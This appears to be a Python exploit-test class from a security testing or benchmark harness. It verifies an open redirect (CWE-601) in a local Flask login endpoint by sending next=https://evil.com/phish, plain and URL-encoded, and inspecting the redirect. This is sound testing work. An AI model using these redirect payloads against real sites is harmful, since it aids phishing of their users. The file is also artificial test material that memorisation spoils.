"""PoC: Open redirect via ?next= parameter in Flask (CWE-601)."""
from mosaic.oracle.exploit import ExploitTest


class FlaskOpenRedirectExploit(ExploitTest):
    """Open redirect: login with next=https://evil.com redirects user off-site."""

    def __init__(self, base_url: str = "http://localhost:5205"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "flask_open_redirect"

    def setup(self) -> None:
        pass

    def execute(self) -> tuple[bool, str]:
        evil_url = "https://evil.com/phish"
        evidence = []

        # Login with next= pointing to attacker domain, don't follow redirect
        resp = self.http_post(
            f"/login?next={evil_url}",
            json={"username": "testuser", "password": "testpass"},
            follow_redirects=False,
        )

        evidence.append(f"Status: {resp.status_code}")

        location = resp.headers.get("Location", resp.headers.get("location", ""))
        evidence.append(f"Location header: {location}")

        if resp.status_code in (301, 302, 303, 307, 308) and "evil.com" in location:
            return True, (
                f"CWE-601 Open Redirect confirmed. "
                f"Login redirected to attacker URL: {location}. "
                + " | ".join(evidence)
            )

        # Check if the response body contains the evil URL (JS/meta redirect)
        if "evil.com" in resp.text:
            return True, (
                f"CWE-601 Open Redirect confirmed in response body. "
                + " | ".join(evidence)
            )

        # Try with URL-encoded next param
        import urllib.parse
        encoded_url = urllib.parse.quote(evil_url, safe='')
        resp2 = self.http_post(
            f"/login?next={encoded_url}",
            json={"username": "testuser", "password": "testpass"},
            follow_redirects=False,
        )
        location2 = resp2.headers.get("Location", resp2.headers.get("location", ""))
        evidence.append(f"Encoded attempt - Status: {resp2.status_code}, Location: {location2}")

        if resp2.status_code in (301, 302, 303, 307, 308) and "evil.com" in location2:
            return True, (
                f"CWE-601 Open Redirect confirmed (URL-encoded). "
                f"Login redirected to: {location2}. "
                + " | ".join(evidence)
            )

        return False, "No open redirect detected. " + " | ".join(evidence)
